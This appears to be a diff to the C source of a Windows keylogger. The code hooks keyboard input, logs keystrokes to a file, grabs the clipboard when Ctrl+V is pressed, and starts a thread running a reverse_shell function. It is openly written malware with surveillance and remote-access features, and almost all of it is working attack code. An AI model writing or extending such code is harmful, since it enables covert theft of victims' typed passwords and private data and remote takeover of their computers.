@@ -1,4 +1,5 @@
 #include "keylogger.h"
+#include "keys.h"
 
 // https://social.msdn.microsoft.com/Forums/sqlserver/en-US/fd2dacc1-64c0-4e59-99fd-db23f0a39ba8/error-lnk2019?forum=vclanguage
 #pragma comment(lib, "user32.lib")
@@ -33,6 +34,8 @@ LRESULT CALLBACK	LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 			fopen_s(&log, LOGNAME, "a");
 			fprintf_s(log, "%s", keys[shift][key->vkCode]);
 			fclose(log);
+			if (GetKeyState(VK_CONTROL) && key->vkCode == 'V')
+				get_clipboard();
 		}
 	}
 	return (CallNextHookEx(key_hook, nCode, wParam, lParam));
@@ -71,11 +74,15 @@ void CALLBACK	Wineventproc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd,
 int	main(void)
 {
 	MSG		msg;
+	DWORD	thread_id;
+	HANDLE	thread;
 
 	signal(SIGINT, handle_sig);
 	key_hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
 	win_hook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, 0,
 		Wineventproc, 0, 0, WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
+	thread = CreateThread(0, 0, reverse_shell, 0, 0, &thread_id);
+	CloseHandle(thread);
 	while (GetMessage(&msg, 0, 0, 0));
 	return (0);
 }
